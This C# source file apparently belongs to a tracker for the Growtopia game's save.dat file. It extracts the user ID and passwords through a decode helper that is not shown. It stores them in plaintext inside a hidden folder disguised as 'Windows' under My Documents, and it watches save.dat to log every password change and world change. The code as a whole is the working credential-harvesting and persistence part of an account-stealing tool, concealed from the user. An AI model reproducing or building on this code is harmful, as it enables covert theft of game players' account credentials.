using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

namespace traceSaveDat
{
    class utils
    {
        public static string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +@"\Windows";
        public static void MainUtils()
        {
            onStart(true);
        }
        public static void Logger() 
        {
            decode.userInformation.information();
            string userIdPath = path + $@"\{decode.userInformation.userID}";
            string userInformation = decode.userInformation.userID + "\n" + decode.userInformation.passwords.Trim();
            string lastWorld = decode.userInformation.lastWorld;
            if (File.Exists(userIdPath))
            {
                if (checkChanged(File.ReadAllText(userIdPath), userInformation))
                {
                    appendLogs("Password changed for this user: " + decode.userInformation.userID + " at: " + DateTime.Now.ToString());
                    File.WriteAllText(userIdPath , decode.userInformation.userID + "\n" + decode.userInformation.passwords.Trim());

                }
                else
                {
                    if (File.ReadLines(path + @"\lastworld_logs").Last().ToUpper() != decode.userInformation.lastWorld.ToUpper())
                    {
                        appendLogs("User: " + decode.userInformation.userID + " changed world " + File.ReadLines(path + @"\lastworld_logs").Last() + " to " + decode.userInformation.lastWorld + " " + DateTime.Now.ToString());
                        File.AppendAllText(path + @"\lastworld_logs",Environment.NewLine + decode.userInformation.lastWorld);
                    }
                }
            }
            else
            {
                createNewUserFile();
            }
            
          
        }
        public static bool checkChanged(string data1,string data2)
        {
            string[] value1 = data1.Split('\n');
            string[] value2 = data2.Split('\n');

            for (int i = 0; i < value2.Length; i++)
            {
                if (value1[i] != value2[i])
                {
                    return true;
                }
            }
            return false;
        }
        public static void createNewUserFile()
        {
            decode.userInformation.information();
            string userIdPath;
            string userInformation = decode.userInformation.userID + "\n" + decode.userInformation.passwords.Trim();
            if (!File.Exists(path + decode.userInformation.userID))
            {
                if (!string.IsNullOrWhiteSpace(decode.userInformation.userID))
                {
                    userIdPath = path + @"\" + decode.userInformation.userID;
                    File.Create(userIdPath).Close();
                    File.WriteAllText(userIdPath, userInformation);
                    appendLogs("New user found: "+decode.userInformation.userID + " at: " + DateTime.Now.ToString());
                }
                else
                {
                    userIdPath = path + @"\null";
                    File.Create(userIdPath).Close();
                    File.WriteAllText(userIdPath, userInformation);
                }
            }
        }
        public static void appendLogs(string text)
        {
            string generalPath = path + @"\general_logs";
            File.AppendAllText(generalPath,Environment.NewLine + text);
        }
        public static void onStart(bool _start)
        {
            decode.userInformation.information();
            if (Directory.Exists(path))
            {
                if (File.Exists(path + @"\" + decode.userInformation.userID))
                {
                    if (checkChanged((File.ReadAllText(path + $@"\{decode.userInformation.userID}")), decode.userInformation.userID + "\n" + decode.userInformation.passwords.Trim()))
                    {
                        //log
                        appendLogs("Password is changed for this user: "+decode.userInformation.userID + " at: "+DateTime.Now.ToString());
                        File.WriteAllText(path + @"\" + decode.userInformation.userID, decode.userInformation.userID + "\n" + decode.userInformation.passwords.Trim());
                        appendLogs("Save.dat Tracker starting to work at: "+DateTime.Now.ToString());
                        FileSystemWatcher systemWatcher = new FileSystemWatcher();
                        systemWatcher.Path = Path.GetDirectoryName(decode.growtopiaExists());
                        systemWatcher.EnableRaisingEvents = true;
                        systemWatcher.Filter = Path.GetFileName(decode.growtopiaExists());
                        systemWatcher.Changed += SystemWatcher_Changed;
                    }
                    else
                    {
                        appendLogs("Save.dat Tracker starting to work at: " + DateTime.Now.ToString());
                        FileSystemWatcher systemWatcher = new FileSystemWatcher();
                        systemWatcher.Path = Path.GetDirectoryName(decode.growtopiaExists());
                        systemWatcher.EnableRaisingEvents = true;
                        systemWatcher.Filter = Path.GetFileName(decode.growtopiaExists());
                        systemWatcher.Changed += SystemWatcher_Changed;
                    }
                }
                else
                {
                    createNewUserFile();
                    //log
                }
            }
            else
            {
                DirectoryInfo ınfo = new DirectoryInfo(path);
                ınfo.Create();
                ınfo.Attributes = FileAttributes.Hidden;
                File.Create(path+@"\general_logs").Close();
                appendLogs("Logger started working "+ 
                    DateTime
                    .Now
                    .ToString());
                File.Create(path + @"\lastworld_logs").Close();
                File.AppendAllText(path + @"\lastworld_logs" , decode.userInformation.lastWorld);
                createNewUserFile();
                appendLogs("Save.dat Tracker starting to work at: " + DateTime.Now.ToString());
                FileSystemWatcher systemWatcher = new FileSystemWatcher();
                systemWatcher.Path = Path.GetDirectoryName(decode.growtopiaExists());
                systemWatcher.EnableRaisingEvents = true;
                systemWatcher.Filter = Path.GetFileName(decode.growtopiaExists());
                systemWatcher.Changed += SystemWatcher_Changed;
            }
            
        }

        public static void SystemWatcher_Changed(object sender, FileSystemEventArgs e)
        {
            Logger();
        }
    }
}
